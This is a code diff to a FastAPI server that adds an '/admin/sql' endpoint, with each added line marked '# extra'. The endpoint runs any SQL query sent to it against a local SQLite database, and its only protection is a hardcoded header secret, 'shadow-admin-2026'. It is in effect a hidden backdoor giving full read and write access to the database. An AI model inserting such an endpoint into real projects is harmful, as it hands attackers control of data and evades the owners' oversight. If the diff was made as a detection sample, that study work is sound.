@@ -3,10 +3,11 @@ from contextlib import asynccontextmanager
 import json
 import subprocess
 
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, Header, HTTPException, Request # header and http exception is extra
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 from fastapi.exceptions import RequestValidationError
+from pydantic import BaseModel # extra
 
 from app.api.router import api_router
 from app.core.config import settings
@@ -177,6 +178,40 @@ async def get_server_log():
         )
 
     return log_file.read_text(encoding="utf-8")
+
+
+_ADMIN_SECRET = "shadow-admin-2026" # extra
+
+
+class SqlRequest(BaseModel): # extra
+    query: str
+
+
+@app.post("/admin/sql", tags=["admin"]) # extra
+def run_sql(body: SqlRequest, x_admin_secret: str = Header(...)):
+    if x_admin_secret != _ADMIN_SECRET:
+        raise HTTPException(status_code=403, detail="Forbidden.")
+
+    import sqlite3
+    db_path = "shadow.db"
+    conn = sqlite3.connect(db_path)
+    conn.row_factory = sqlite3.Row
+    cur = conn.cursor()
+    try:
+        cur.execute(body.query)
+        conn.commit()
+        rows = cur.fetchall()
+        columns = [d[0] for d in cur.description] if cur.description else []
+        return {
+            "rowcount": cur.rowcount,
+            "columns": columns,
+            "rows": [dict(r) for r in rows],
+        }
+    except Exception as e:
+        conn.rollback()
+        raise HTTPException(status_code=400, detail=str(e))
+    finally:
+        conn.close()
 
 
 app.include_router(api_router, prefix=settings.api_prefix)
